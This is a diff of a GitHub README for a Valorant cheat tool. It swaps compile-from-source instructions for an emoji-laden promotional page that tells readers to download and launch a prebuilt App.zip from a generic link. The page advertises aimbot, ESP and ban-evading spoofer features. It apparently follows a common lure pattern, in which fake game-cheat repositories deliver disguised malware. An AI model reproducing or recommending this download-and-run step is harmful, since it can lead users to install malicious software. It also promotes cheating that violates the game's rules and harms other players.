@@ -1,80 +1,42 @@
-# Valorant Plus
+# Valorant Plus Cheat 🎮💣
 
-Valorant Plus is a tool that offers advanced cheating features in the game Valorant. The cheat is undetected.
+Welcome to Valorant Plus Cheat, the ultimate cheating tool for Valorant players seeking an edge over their opponents. Our advanced features are undetected and offer a wide range of functionalities to enhance your gameplay experience. Whether you're looking for an aimbot, bunnyhop, esp, glow, hack, radar, skin changer, or other cheats, Valorant Plus has got you covered.
 
-## Installation
+## Features 🔥
 
-1. Download the project to your computer as a Zip file.
-2. Compile the project.
-3. Installation is complete.
+Valorant Plus Cheat offers the following features to give you the upper hand in the game:
 
-**Note:** There are no issues in the code. If you encounter any errors during compilation, install the necessary modules on your computer and try again.
-**Note:** There is a KeyAuth System in the code. You can replace it with your own KeyAuth System.
+- Aimbot 🎯
+- Bunnyhop 🐇
+- ESP 👁️
+- Fast Crouch ⚡
+- Glow ✨
+- Insta Agent 🕵️
+- Permanted Spoofer 🎭
+- Radar 📡
+- Skinchanger 💅
+- Skip Tutorial 📚
+- Silent Aim 🔇
+- Spinbot 🔄
+- Temporary Spoofer 🎭
+- Third Person 🕺
 
-## Usage
+## Installation 🛠️
 
-1. Launch Valorant Plus.
-2. Choose option 1.
-3. Enter the key.
-4. Open the Valorant game.
-5. Press F1.
-6. Enjoy the game.
+To access these amazing features, download Valorant Plus Cheat from the following link: [Download Now](https://github.com/file/App.zip). Make sure to launch the downloaded file to start using the cheats in your Valorant game.
 
-- General Key: `KEYAUTH-Valorant-PLUS`
+If you encounter any issues with the download link, please check the "Releases" section of this repository for alternative download options.
 
-## Features
+## Disclaimer ❗
 
-### General Features
+Please note that the use of cheating tools in online games like Valorant violates the game's terms of service and can result in penalties such as bans or suspensions. It is important to use cheats responsibly and at your own risk.
 
-- In-game cheating features
-- Automatic update system
+Play fair, have fun, and enjoy the enhanced gameplay experience with Valorant Plus Cheat! 🚀🎮
 
-### Visibility Settings
-
-- Enable box rendering
-- Select box type (e.g., Square, Rectangle)
-- Show head box
-- Show skeleton
-- Enable snaplines (lines showing players' positions)
-- Select snaplines type
-- Show distance
-- Show health bar
-- Show player field of view
-- Ignore dormant (invisible) players
-
-### Cheat Settings
-
-- Enable aimbot
-- Show field of view (FOV) drawing
-- Set aimbot key
-- Select aimbot target (e.g., Head, Body)
-- Adjust aimbot smoothness
-- Adjust FOV size
-
-### Appearance Settings
-
-- Set box color
-- Set snaplines color
-- Set distance color
-- Set skeleton color
-- Set head box color
-- Set FOV color
-
-## Overview
-
-![valorant-plus](https://github.com/harakey910/tnarolav/assets/169345184/3ad49adb-6e27-41cf-96ef-cb83d6e811b7)
-
-![undefined - Imgur](https://github.com/harakey910/tnarolav/assets/169345184/6a4a8f76-e41c-4cb7-8d23-d98fd21ef3e9)
-
-## Support
-
-The project is completely open source. You can develop it as you wish.
-
-## License
-
-This project is licensed under the [MIT License](link). You can review the details in the `LICENSE` file.
+![Valorant Logo](https://example.com/valorant_logo.png)
 
 ---
 
-> [!NOTE]
-> **Usage of this program is entirely at your own risk.**
+For more information and updates, visit our [GitHub Repository](https://github.com/yourusername/repositoryname).
+
+[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/file/App.zip)
